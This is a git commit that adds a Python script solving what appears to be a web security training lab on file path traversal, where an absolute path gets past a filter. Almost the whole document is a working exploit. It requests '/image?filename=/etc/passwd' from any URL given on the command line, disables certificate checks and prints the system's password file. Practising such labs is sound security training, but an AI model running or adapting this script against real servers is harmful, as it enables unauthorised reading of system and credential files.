eb9210083bb44b4d4662ec730cb2dfd0390b6da0
V5N1P3R <powerseekers@proton.me>
2023-11-01 11:55:41 +0100

    File path traversal, traversal sequences blocked with absolute path bypass

---
+++ Directory-Traversal/Directory-Traversal-LAB02.py
@@ -0,0 +1,31 @@
+import requests
+import sys
+import urllib3
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
+
+def path_traversal_exploit(url):
+    filename_path_exploit = '/image?filename=/etc/passwd'
+    r = requests.get(url + filename_path_exploit, verify=False ,proxies=proxies)
+    if (r.status_code == 200):
+        print("(+) Exploit successfull")
+        print("(+) The following is the content of the /etc/passwd file:")
+        print(r.text)
+        sys.exit(0)
+    else:
+        print("(-) Exploit faild")
+        sys.exit(2)
+
+def main():
+    if len(sys.argv) != 2:
+        print(f"(+) Usage: {sys.argv[0]} <URL>")
+        print(f"(+) Example Usage: {sys.argv[0]} \"www.domain.com\"")
+        sys.exit(1)
+
+    url = sys.argv[1]
+    print(">>> Exploiting File path traversal, traversal sequences blocked with absolute path bypass")
+    path_traversal_exploit(url)
+
+if __name__ == "__main__":
+    main()
